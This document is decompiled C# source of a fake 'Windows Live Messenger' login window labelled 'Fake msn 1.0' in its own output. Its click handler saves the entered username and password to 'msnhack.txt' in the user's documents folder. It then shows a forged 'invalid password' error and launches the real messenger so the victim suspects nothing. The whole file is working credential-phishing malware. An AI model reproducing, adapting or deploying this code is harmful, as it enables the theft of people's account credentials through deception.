using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using hemlig_mapp.My;
using hemlig_mapp.My.Resources;

namespace hemlig_mapp;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	[AccessedThroughProperty("MenuStrip1")]
	private MenuStrip _MenuStrip1;

	[AccessedThroughProperty("ArkivToolStripMenuItem")]
	private ToolStripMenuItem _ArkivToolStripMenuItem;

	[AccessedThroughProperty("KontakterToolStripMenuItem")]
	private ToolStripMenuItem _KontakterToolStripMenuItem;

	[AccessedThroughProperty("ÅtgärderToolStripMenuItem")]
	private ToolStripMenuItem toolStripMenuItem_0;

	[AccessedThroughProperty("Panel1")]
	private Panel _Panel1;

	[AccessedThroughProperty("VerktygToolStripMenuItem")]
	private ToolStripMenuItem _VerktygToolStripMenuItem;

	[AccessedThroughProperty("HjälpToolStripMenuItem")]
	private ToolStripMenuItem toolStripMenuItem_1;

	[AccessedThroughProperty("TextBox2")]
	private TextBox _TextBox2;

	[AccessedThroughProperty("TextBox1")]
	private TextBox _TextBox1;

	[AccessedThroughProperty("PictureBox1")]
	private PictureBox _PictureBox1;

	internal virtual MenuStrip MenuStrip1
	{
		[DebuggerNonUserCode]
		get
		{
			return _MenuStrip1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_MenuStrip1 = value;
		}
	}

	internal virtual ToolStripMenuItem ArkivToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _ArkivToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ArkivToolStripMenuItem = value;
		}
	}

	internal virtual ToolStripMenuItem KontakterToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _KontakterToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_KontakterToolStripMenuItem = value;
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem_0
	{
		[DebuggerNonUserCode]
		get
		{
			return toolStripMenuItem_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			toolStripMenuItem_0 = value;
		}
	}

	internal virtual Panel Panel1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Panel1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Panel1 = value;
		}
	}

	internal virtual ToolStripMenuItem VerktygToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _VerktygToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_VerktygToolStripMenuItem = value;
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem_1
	{
		[DebuggerNonUserCode]
		get
		{
			return toolStripMenuItem_1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			toolStripMenuItem_1 = value;
		}
	}

	internal virtual TextBox TextBox2
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			//IL_002e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0038: Expected O, but got Unknown
			//IL_0046: Unknown result type (might be due to invalid IL or missing references)
			//IL_0050: Expected O, but got Unknown
			//IL_0085: Unknown result type (might be due to invalid IL or missing references)
			//IL_008f: Expected O, but got Unknown
			//IL_009d: Unknown result type (might be due to invalid IL or missing references)
			//IL_00a7: Expected O, but got Unknown
			if (_TextBox2 != null)
			{
				((Control)_TextBox2).remove_TextChanged((EventHandler)TextBox2_TextChanged);
				((Control)_TextBox2).remove_KeyPress(new KeyPressEventHandler(TextBox2_KeyPress));
				((Control)_TextBox2).remove_KeyDown(new KeyEventHandler(TextBox2_KeyDown));
			}
			_TextBox2 = value;
			if (_TextBox2 != null)
			{
				((Control)_TextBox2).add_TextChanged((EventHandler)TextBox2_TextChanged);
				((Control)_TextBox2).add_KeyPress(new KeyPressEventHandler(TextBox2_KeyPress));
				((Control)_TextBox2).add_KeyDown(new KeyEventHandler(TextBox2_KeyDown));
			}
		}
	}

	internal virtual TextBox TextBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox1 = value;
		}
	}

	internal virtual PictureBox PictureBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _PictureBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			if (_PictureBox1 != null)
			{
				((Control)_PictureBox1).remove_MouseHover((EventHandler)PictureBox1_MouseHover);
				((Control)_PictureBox1).remove_Click((EventHandler)PictureBox1_Click);
				((Control)_PictureBox1).remove_MouseLeave((EventHandler)PictureBox1_MouseLeave);
			}
			_PictureBox1 = value;
			if (_PictureBox1 != null)
			{
				((Control)_PictureBox1).add_MouseHover((EventHandler)PictureBox1_MouseHover);
				((Control)_PictureBox1).add_Click((EventHandler)PictureBox1_Click);
				((Control)_PictureBox1).add_MouseLeave((EventHandler)PictureBox1_MouseLeave);
			}
		}
	}

	[DebuggerNonUserCode]
	public Form1()
	{
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_0269: Unknown result type (might be due to invalid IL or missing references)
		//IL_0273: Expected O, but got Unknown
		//IL_03a7: Unknown result type (might be due to invalid IL or missing references)
		//IL_03b1: Expected O, but got Unknown
		//IL_0496: Unknown result type (might be due to invalid IL or missing references)
		//IL_04a0: Expected O, but got Unknown
		//IL_04f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_04fe: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		MenuStrip1 = new MenuStrip();
		ArkivToolStripMenuItem = new ToolStripMenuItem();
		KontakterToolStripMenuItem = new ToolStripMenuItem();
		ToolStripMenuItem_0 = new ToolStripMenuItem();
		VerktygToolStripMenuItem = new ToolStripMenuItem();
		ToolStripMenuItem_1 = new ToolStripMenuItem();
		Panel1 = new Panel();
		PictureBox1 = new PictureBox();
		TextBox2 = new TextBox();
		TextBox1 = new TextBox();
		((Control)MenuStrip1).SuspendLayout();
		((Control)Panel1).SuspendLayout();
		((ISupportInitialize)PictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		((ToolStrip)MenuStrip1).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[5]
		{
			(ToolStripItem)ArkivToolStripMenuItem,
			(ToolStripItem)KontakterToolStripMenuItem,
			(ToolStripItem)ToolStripMenuItem_0,
			(ToolStripItem)VerktygToolStripMenuItem,
			(ToolStripItem)ToolStripMenuItem_1
		});
		MenuStrip menuStrip = MenuStrip1;
		Point location = new Point(0, 0);
		((Control)menuStrip).set_Location(location);
		((Control)MenuStrip1).set_Name("MenuStrip1");
		MenuStrip menuStrip2 = MenuStrip1;
		Size size = new Size(393, 24);
		((Control)menuStrip2).set_Size(size);
		((Control)MenuStrip1).set_TabIndex(0);
		((Control)MenuStrip1).set_Text("MenuStrip1");
		((ToolStripItem)ArkivToolStripMenuItem).set_Name("ArkivToolStripMenuItem");
		ToolStripMenuItem arkivToolStripMenuItem = ArkivToolStripMenuItem;
		size = new Size(43, 20);
		((ToolStripItem)arkivToolStripMenuItem).set_Size(size);
		((ToolStripItem)ArkivToolStripMenuItem).set_Text("Arkiv");
		((ToolStripItem)KontakterToolStripMenuItem).set_Name("KontakterToolStripMenuItem");
		ToolStripMenuItem kontakterToolStripMenuItem = KontakterToolStripMenuItem;
		size = new Size(66, 20);
		((ToolStripItem)kontakterToolStripMenuItem).set_Size(size);
		((ToolStripItem)KontakterToolStripMenuItem).set_Text("Kontakter");
		((ToolStripItem)ToolStripMenuItem_0).set_Name("ÅtgärderToolStripMenuItem");
		ToolStripMenuItem obj = ToolStripMenuItem_0;
		size = new Size(62, 20);
		((ToolStripItem)obj).set_Size(size);
		((ToolStripItem)ToolStripMenuItem_0).set_Text("Åtgärder");
		((ToolStripItem)VerktygToolStripMenuItem).set_Name("VerktygToolStripMenuItem");
		ToolStripMenuItem verktygToolStripMenuItem = VerktygToolStripMenuItem;
		size = new Size(56, 20);
		((ToolStripItem)verktygToolStripMenuItem).set_Size(size);
		((ToolStripItem)VerktygToolStripMenuItem).set_Text("Verktyg");
		((ToolStripItem)ToolStripMenuItem_1).set_Name("HjälpToolStripMenuItem");
		ToolStripMenuItem obj2 = ToolStripMenuItem_1;
		size = new Size(43, 20);
		((ToolStripItem)obj2).set_Size(size);
		((ToolStripItem)ToolStripMenuItem_1).set_Text("Hjälp");
		((Control)Panel1).set_BackgroundImage((Image)componentResourceManager.GetObject("Panel1.BackgroundImage"));
		((Control)Panel1).set_BackgroundImageLayout((ImageLayout)0);
		((Control)Panel1).get_Controls().Add((Control)(object)PictureBox1);
		((Control)Panel1).get_Controls().Add((Control)(object)TextBox2);
		((Control)Panel1).get_Controls().Add((Control)(object)TextBox1);
		((Control)Panel1).set_Dock((DockStyle)5);
		Panel panel = Panel1;
		location = new Point(0, 24);
		((Control)panel).set_Location(location);
		((Control)Panel1).set_Name("Panel1");
		Panel panel2 = Panel1;
		size = new Size(393, 875);
		((Control)panel2).set_Size(size);
		((Control)Panel1).set_TabIndex(1);
		((Control)PictureBox1).set_BackColor(Color.Transparent);
		PictureBox pictureBox = PictureBox1;
		location = new Point(154, 431);
		((Control)pictureBox).set_Location(location);
		((Control)PictureBox1).set_Name("PictureBox1");
		PictureBox pictureBox2 = PictureBox1;
		size = new Size(81, 29);
		((Control)pictureBox2).set_Size(size);
		PictureBox1.set_TabIndex(2);
		PictureBox1.set_TabStop(false);
		((TextBoxBase)TextBox2).set_BorderStyle((BorderStyle)1);
		((Control)TextBox2).set_Font(new Font("Times New Roman", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		TextBox textBox = TextBox2;
		location = new Point(83, 245);
		((Control)textBox).set_Location(location);
		((Control)TextBox2).set_Name("TextBox2");
		TextBox2.set_PasswordChar('*');
		TextBox textBox2 = TextBox2;
		size = new Size(225, 20);
		((Control)textBox2).set_Size(size);
		((Control)TextBox2).set_TabIndex(1);
		((TextBoxBase)TextBox1).set_BorderStyle((BorderStyle)1);
		TextBox textBox3 = TextBox1;
		location = new Point(83, 201);
		((Control)textBox3).set_Location(location);
		((Control)TextBox1).set_Name("TextBox1");
		TextBox textBox4 = TextBox1;
		size = new Size(225, 20);
		((Control)textBox4).set_Size(size);
		((Control)TextBox1).set_TabIndex(0);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackgroundImage((Image)componentResourceManager.GetObject("$this.BackgroundImage"));
		((Control)this).set_BackgroundImageLayout((ImageLayout)0);
		size = new Size(393, 899);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)Panel1);
		((Control)this).get_Controls().Add((Control)(object)MenuStrip1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MainMenuStrip(MenuStrip1);
		((Control)this).set_Name("Form1");
		((Form)this).set_Text("Windows Live Messenger");
		((Control)MenuStrip1).ResumeLayout(false);
		((Control)MenuStrip1).PerformLayout();
		((Control)Panel1).ResumeLayout(false);
		((Control)Panel1).PerformLayout();
		((ISupportInitialize)PictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void Button1_Click(object sender, EventArgs e)
	{
	}

	private void PictureBox1_Click(object sender, EventArgs e)
	{
		//IL_009a: Unknown result type (might be due to invalid IL or missing references)
		((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + "\\msnhack.txt", "\r\n____________________G33K G33K G33K G33K G33K G33K G33K G33K G33K____________________\r\n" + Conversions.ToString(((ServerComputer)MyProject.Computer).get_Clock().get_LocalTime()) + "\r\n\r\n" + TextBox1.get_Text() + "\r\n\r\n" + TextBox2.get_Text() + "\r\n\r\n____________________Fake msn 1.0, Gjord av G33K0@flashback.info________________________\r\n", true);
		Interaction.MsgBox((object)"Du kunde inte loggas in på Windows Live Messenger eftersom inloggningsnamnet inte finns eller för att lösenordet är ogiltigt.\r\n\r\nOm du har glömt lösenordet klickar du på Har du glömt lösenordet? längst ned i Messenger-fönstret.\r\n\r\nFelkod: 80048821", (MsgBoxStyle)64, (object)"Windows Live Messenger");
		((Control)this).Hide();
		Process.Start("msnmsgr.exe");
		ProjectData.EndApp();
	}

	private void TextBox2_KeyDown(object sender, KeyEventArgs e)
	{
	}

	private void TextBox2_KeyPress(object sender, KeyPressEventArgs e)
	{
		if (e.get_KeyChar() == '\r')
		{
			PictureBox1_Click(this, EventArgs.Empty);
		}
	}

	private void TextBox2_TextChanged(object sender, EventArgs e)
	{
	}

	private void PictureBox1_MouseHover(object sender, EventArgs e)
	{
		((Control)PictureBox1).set_BackgroundImage((Image)(object)Resources.mouse);
	}

	private void PictureBox1_MouseLeave(object sender, EventArgs e)
	{
		((Control)PictureBox1).set_BackgroundImage((Image)(object)Resources.@out);
	}
}
